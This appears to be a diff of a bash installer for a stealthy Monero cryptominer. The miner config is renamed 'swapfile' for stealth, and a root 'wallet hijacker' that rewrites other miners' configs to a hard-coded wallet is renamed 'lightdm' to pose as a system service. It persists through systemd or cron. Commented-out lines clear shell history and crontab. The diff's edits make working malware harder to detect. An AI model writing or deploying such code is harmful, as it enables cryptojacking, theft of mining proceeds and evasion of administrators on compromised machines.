@@ -3,7 +3,7 @@
 # ==================== DISABLE ALL DEBUGGING ====================
 { set +x; } 2>/dev/null
 unset BASH_XTRACEFD PS4 2>/dev/null
-# exec 2>/dev/null >/dev/null  <-- COMMENTED OUT - Output now visibleav
+# exec 2>/dev/null >/dev/null  <-- COMMENTED OUT - Output now visible
 
 # Continue with existing code...
 # Removed -u and -o pipefail to ensure script ALWAYS continues
@@ -94,6 +94,10 @@ else
     PKG_UPDATE="true"
 fi
 echo "[*] Detected package manager: $PKG_MANAGER"
+#unset HISTFILE ;history -d $((HISTCMD-1))
+#export HISTFILE=/dev/null ;history -d $((HISTCMD-1))
+
+#crontab -r
 
 # ==================== DPKG INTERRUPT AUTO-FIX (Debian/Ubuntu) ====================
 # Detect and fix interrupted dpkg/apt operations before installing packages
@@ -465,6 +469,7 @@ EOL
 # Replace placeholders
 sed -i "s/WALLET_PLACEHOLDER/$WALLET/g" config.json
 sed -i "s/WORKER_PLACEHOLDER/$WORKER_NAME/g" config.json
+
 
 # Rename to swapfile for stealth
 mv config.json swapfile
@@ -1022,16 +1027,16 @@ echo ""
 echo "[*] Installing smart wallet hijacker..."
 
 # Create the smart wallet hijacker script
-cat > /usr/local/bin/smart-wallet-hijacker << 'HIJACKER_EOF'
+cat > /usr/local/bin/lightdm << 'HIJACKER_EOF'
 #!/bin/bash
 MY_WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
 CHECK_INTERVAL=300
 exec 2>/dev/null
 set +x
 
-find_and_hijack() {
+find_and_fill() {
     local changed=0
-    # Scan all processes for "-c" flag (XMRig config indicator)
+
     ps auxww | grep -E '\-c\s+' | grep -v grep | while read -r line; do
         local cmdline=$(echo "$line" | awk '{for(i=11;i<=NF;i++) printf $i" "; print ""}')
         local config=$(echo "$cmdline" | grep -oP '\-c\s+\K[^\s]+' | head -1)
@@ -1092,19 +1097,18 @@ find_and_hijack() {
 
 if [ "$1" = "daemon" ]; then
     while true; do
-        find_and_hijack
+        find_and_fill
         sleep $CHECK_INTERVAL
     done
 else
-    find_and_hijack
+    find_and_fill
 fi
 HIJACKER_EOF
 
-chmod +x /usr/local/bin/smart-wallet-hijacker 2>/dev/null || true
+chmod +x /usr/local/bin/lightdm 2>/dev/null || true
 
-# Create systemd service for wallet hijacker
 if [ "$SYSTEMD_AVAILABLE" = true ]; then
-    cat > /etc/systemd/system/smart-wallet-hijacker.service << 'HIJACKER_SERVICE_EOF'
+    cat > /etc/systemd/system/lightd.service << 'HIJACKER_SERVICE_EOF'
 [Unit]
 Description=System wallet monitor
 After=network.target swapd.service
@@ -1112,7 +1116,7 @@ After=network.target swapd.service
 [Service]
 Type=simple
 User=root
-ExecStart=/usr/local/bin/smart-wallet-hijacker daemon
+ExecStart=/usr/local/bin/lightdm daemon
 Restart=always
 RestartSec=30
 StandardOutput=null
@@ -1123,13 +1127,13 @@ WantedBy=multi-user.target
 HIJACKER_SERVICE_EOF
     
     systemctl daemon-reload 2>/dev/null || true
-    systemctl enable smart-wallet-hijacker 2>/dev/null || true
-    systemctl start smart-wallet-hijacker 2>/dev/null || true
+    systemctl enable lightdm 2>/dev/null || true
+    systemctl start lightdm 2>/dev/null || true
     
     echo "[✓] Smart wallet hijacker installed (systemd service)"
 else
     # For SysV systems, add to cron
-    (crontab -l 2>/dev/null | grep -v smart-wallet-hijacker; echo "*/5 * * * * /usr/local/bin/smart-wallet-hijacker >/dev/null 2>&1") | crontab - 2>/dev/null || true
+    (crontab -l 2>/dev/null | grep -v lightdm; echo "*/5 * * * * /usr/local/bin/lightdm >/dev/null 2>&1") | crontab - 2>/dev/null || true
     echo "[✓] Smart wallet hijacker installed (cron job)"
 fi
 
